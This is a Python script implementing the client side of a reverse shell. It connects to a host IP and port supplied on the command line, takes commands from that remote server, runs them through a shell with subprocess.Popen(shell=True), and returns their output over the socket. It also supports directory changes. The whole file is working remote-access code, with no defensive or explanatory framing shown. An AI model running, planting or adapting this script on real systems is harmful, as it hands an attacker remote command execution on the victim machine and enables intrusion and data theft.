import socket
import subprocess
import os
import sys

#Function to Receive Inbound Messages and Return Them to the Session Handler
def inbound():
    message = ''
    print('[+] Awaiting command...')
    while True:
        try:
            message = sock.recv(1024).decode()
            return(message)
        except Exception:
            sock.close()

#Function to Send Responses to the Server
def outbound(message):
    response = str(message).encode()
    sock.send(response)

#Session Handler
def session_handler():
    print(f'[+] Connecting to {host_ip}')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}')
    while True:
            message = inbound()
            print(f'[+] Message received - {message}')
            #Exit Message Handling
            if message == 'exit':
                print('[!] The server has terminated the session.')
                sock.close()
                break
            #Change Directory Script
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split (" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f'[+] Changed directory to {cur_dir}')
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('Invalid directory.')
                    continue
                #This exception has not been tested.
                except PermissionError:
                    outbound('You do not have adequate permissions for this operation.')
                    continue           
            #Subprocess Command Handling
            elif message == 'background':
                pass
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    host_ip=sys.argv[1]
    host_port=int(sys.argv[2])
    session_handler()
except IndexError:
    print('Command line argument(s) missing. Expecting IPv4 Address and Port Number. Please try again.')
except Exception as e:
    print(e)